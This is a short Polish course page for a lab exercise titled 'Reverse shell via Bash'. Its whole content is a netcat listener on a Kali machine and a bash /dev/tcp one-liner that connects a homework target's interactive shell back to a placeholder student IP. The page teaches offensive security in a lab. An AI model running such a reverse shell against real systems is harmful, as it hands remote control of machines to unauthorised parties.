---
title: "6.3 - Reverse shell przez Bash"
order: 3
---

```bash
#Kali (terminal 1):
nc -lvp 12303

#Remote Shells HOMEWORK (terminal 2):
bash -i >& /dev/tcp/[IP_STUDENTA]/12303 0>&1
```
